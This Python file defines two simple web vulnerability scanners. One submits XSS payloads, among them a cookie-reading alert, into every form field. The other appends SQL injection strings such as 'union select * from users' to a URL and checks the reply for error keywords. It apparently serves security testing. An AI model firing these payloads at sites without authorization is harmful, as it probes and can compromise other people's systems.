import re
from typing import List
from urllib.parse import urljoin, quote

import requests
from bs4 import BeautifulSoup as bs


def xss_scanner(url: str) -> dict:
    """Scan for XSS vulnerabilities on a given page."""
    xss_payloads = [
        "<script>alert('test');</script>",
        "\"'><script>alert('test')</script>",
        "<img src=x onerror=alert('test')>",
        "<script/src=data:,alert()>",
        '<a onmouseover="alert(document.cookie)">test link</a>',
        '<image/src/onerror=prompt(8)>',
        '%22;alert%28%27RVRSH3LL_XSS%29//',
    ]

    try:
        # Get page content and find all forms
        response = requests.get(url)
        soup = bs(response.content, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action", "")
            method = form.get("method", "get").lower()
            inputs = [{"name": inp.get("name"), "type": inp.get("type", "text")} for inp in form.find_all("input")]

            for payload in xss_payloads:
                # Prepare the data with the payload injected in every input field
                data = {inp["name"]: payload for inp in inputs if inp["name"]}
                target_url = urljoin(url, action)

                if method == "post":
                    form_response = requests.post(target_url, data=data)
                else:
                    form_response = requests.get(target_url, params=data)

                # Check for the payload or similar signs of execution in the response
                if payload in form_response.text or re.search(re.escape(payload), form_response.text, re.IGNORECASE):
                    return {"is_vulnerable": True, "form": form, "payload": payload.strip(), "target_url": target_url}

                # Also look for encoded versions of the payload in the response
                encoded_payload = quote(payload)
                if encoded_payload in form_response.text:
                    return {"is_vulnerable": True, "form": form, "payload": encoded_payload, "target_url": target_url}

        return {"is_vulnerable": False}

    except Exception as e:
        return {"is_vulnerable": False}


def sql_injection_scanner(url: str) -> List[str]:
    """Scan a URL for SQL injection vulnerabilities."""
    payloads = ["'", "';", '"', '";', "')", '")', "'; OR 1=1--", "'; union select * from users--"]
    indicators = ["error", "mysql", "syntax", "unexpected", "warning", "sql"]
    vulnerable_links = []

    try:
        for payload in payloads:
            injected_url = f"{url}{payload}"
            response = requests.get(injected_url)
            if any(indicator in response.text.lower() for indicator in indicators):
                vulnerable_links.append(injected_url)
    except Exception:
        pass

    return list(set(vulnerable_links))
